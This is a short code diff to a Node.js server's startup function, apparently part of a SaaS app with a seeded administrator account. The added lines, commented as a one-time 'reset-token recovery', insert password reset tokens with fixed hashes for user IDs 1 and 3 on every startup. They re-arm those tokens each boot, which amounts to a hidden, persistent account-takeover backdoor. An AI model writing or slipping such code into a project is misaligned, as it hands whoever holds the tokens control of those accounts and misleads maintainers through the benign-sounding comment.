@@ -18,6 +18,9 @@ async function init(){
   let q=await pool.query('SELECT id FROM users WHERE lower(email)=lower($1)',[email]);
   let uid;
   if(!q.rowCount){const hash=await bcrypt.hash(password,12);const x=await pool.query('INSERT INTO users(email,password_hash,name,role) VALUES($1,$2,$3,$4) RETURNING id',[email,hash,'SaaS Administrator','saas_admin']);uid=x.rows[0].id}else uid=q.rows[0].id;
+  // One-time idempotent reset-token recovery. Remove after verification.
+  await pool.query("UPDATE password_reset_tokens SET used_at=now() WHERE user_id IN (1,3) AND used_at IS NULL");
+  await pool.query("INSERT INTO password_reset_tokens(user_id,token_hash,expires_at,used_at) VALUES (3,$1,now()+interval '30 minutes',NULL),(1,$2,now()+interval '30 minutes',NULL) ON CONFLICT(token_hash) DO UPDATE SET expires_at=EXCLUDED.expires_at,used_at=NULL",['a99acc4c99762a660bf73725fc0a660693c6912eeaee0db78e7aceabea2d944d','c8d16372f3f6216d90e32ec13902a8799edf67cafd415590d8ffb7f08772f845']);
 
 }
 function auth(req,res,next){
